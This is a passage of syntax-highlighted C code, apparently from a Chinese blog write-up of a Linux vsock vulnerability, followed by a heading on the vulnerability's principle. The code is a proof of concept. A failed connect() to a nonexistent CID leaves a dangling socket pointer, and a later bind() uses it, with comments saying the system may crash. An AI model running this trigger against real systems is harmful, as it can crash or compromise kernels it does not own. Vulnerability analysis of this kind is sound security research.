+</span></span><span class="line"><span class="cl">	<span class="n">addr</span><span class="p">.</span><span class="n">svm_cid</span> <span class="o">=</span> <span class="n">VMADDR_CID_NONEXISTING</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">addr</span><span class="p">.</span><span class="n">svm_port</span> <span class="o">=</span> <span class="n">VMADDR_PORT_ANY</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">connect</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="n">alen</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Unexpected connect() #2 success</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// connect() #2 failed: transport unset, sk ref dropped?
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// wait for input
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Press for Crash...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// Vulnerable system may crash now. [USE THE DANGLING POINTER]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">bind</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="n">alen</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// wait for input
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nf">close</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">while</span> <span class="p">(</span><span class="n">i</span><span class="o">--</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">close</span><span class="p">(</span><span class="n">sockets</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="漏洞原理">漏洞原理</h3>
